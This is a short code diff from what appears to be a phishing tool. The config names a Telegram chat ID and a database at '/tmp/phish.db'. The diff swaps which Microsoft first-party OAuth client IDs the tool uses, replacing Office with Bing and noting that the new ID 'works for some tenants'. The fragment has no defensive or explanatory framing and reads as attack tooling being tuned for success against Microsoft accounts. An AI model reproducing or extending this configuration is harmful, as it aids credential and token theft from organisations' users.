@@ -14,9 +14,9 @@ TELEGRAM_CHAT = "8877118461"
 DB_PATH = "/tmp/phish.db"
 
 CLIENT_IDS = [
-    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office
     "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
     "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
+    "04f0c124-f2bc-4f59-8241-bfacc1df5e55",  # Microsoft Bing (works for some tenants)
 ]
 CLIENT_ID_INDEX = 0
 
